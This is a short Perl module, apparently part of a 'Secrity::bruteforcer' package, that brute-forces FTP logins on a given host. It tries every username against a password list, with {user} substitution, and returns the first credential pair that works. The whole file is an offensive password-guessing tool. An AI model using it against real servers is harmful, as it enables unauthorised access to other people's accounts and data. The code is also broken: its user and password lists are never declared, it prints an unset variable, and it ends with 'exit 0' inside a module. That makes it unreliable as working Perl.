package Secrity::bruteforcer::ftp;

use 5.006;
use Net::FTP;
use strict;
use warnings;
require Exporter;
=head1 NAME

Secrity::bruteforcer::ftp - The great new Secrity::bruteforcer::ftp!

=head1 VERSION

Version 0.01

=cut

our $VERSION = '0.01';
my $DEBUG = 0;

our @ISA    = qw(Exporter);
our @EXPORT = qw(ftp);

sub ftp {

    my ($host) = @_;
    print "Sclar for $_ : \n";

    my $ftp = Net::FTP->new( "$host", Debug => $DEBUG, Timeout => 5 )
      or warn "Can't connect to $host: $@\n";
    return unless $ftp;
    my $result;

    for (@usrs) {
        my $user = $_;
        for (@pws) {
            my $pwd = $_;
            $pwd =~ s/\{user\}/$user/g if /\{user\}/;
            unless ( $ftp->stat ) {

                #$ftp->quit;
                $ftp = Net::FTP->new( "$host", Debug => $DEBUG )
                  or print "Can't connect to $host: $@\n";
            }
            if ( $ftp->login( $user, $pwd ) ) {
                $result .= "$user $pwd";
                $ftp->quit;
                last;
            }
            print "Can't login ", $ftp->message, "\n" if $DEBUG;
        }
    }
    $ftp->quit;
    return $result;

}

exit 0;
